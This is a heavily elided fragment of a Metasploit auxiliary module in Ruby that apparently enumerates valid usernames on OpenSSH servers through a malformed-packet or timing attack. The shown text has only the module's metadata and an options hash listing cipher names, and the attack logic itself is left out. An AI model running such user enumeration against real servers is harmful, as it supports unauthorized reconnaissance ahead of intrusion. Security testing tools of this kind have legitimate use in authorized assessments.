...
class MetasploitModule < Msf::Auxiliary
  ...
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SSH Username Enumeration v2',
      'Description'    => %q{
        This module uses a malformed packet or timing attack to enumerate users on
        an OpenSSH server, given a specific list of encryption algorithms.
  ...
  def check_user(ip, user, port)
    ...
    opts = {
      ...
      :use_agent       => false,
      :config          => false,
      :encryption      => ['aes128-cbc','aes128-ctr','3des-cbc','blowfish-cbc','aes192-cbc','aes192-ctr','aes256-cbc','aes256-ctr','rijndael128-cbc','rijndael192-cbc','rijndael256-cbc','arcfour128','arcfour256','arcfour'],
